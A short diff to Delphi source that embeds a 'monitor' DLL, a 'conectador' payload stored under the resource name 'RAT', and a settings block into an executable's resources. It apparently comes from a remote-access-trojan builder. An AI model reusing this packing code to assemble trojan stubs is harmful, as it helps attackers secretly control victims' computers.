@@ -37,13 +37,13 @@ var
   hResource: THandle;
 begin
   Result    := False;
-  hResource := BeginUpdateResource(Filename, True);
+  hResource := BeginUpdateResource(Filename, false);
   if hResource <> 0 then
   begin
     if(length(monitor) >0) then
-      UpdateResource(hResource, 'DLL', 'MONITOR', 0, pointer(monitor),length(monitor));
+      UpdateResource(hResource, 'DLL', 'monitor', 0, pointer(monitor),length(monitor));
     if(length(conectador) >0) then
-      UpdateResource(hResource, 'DLL', 'RAT', 0, pointer(conectador),length(conectador));
+      UpdateResource(hResource, 'DLL', 'rat', 0, pointer(conectador),length(conectador));
     if UpdateResource(hResource, RT_RCDATA, RC_SETTINGS, 0, Settings,
       SizeOf(Settings^)) then
       Result := True;
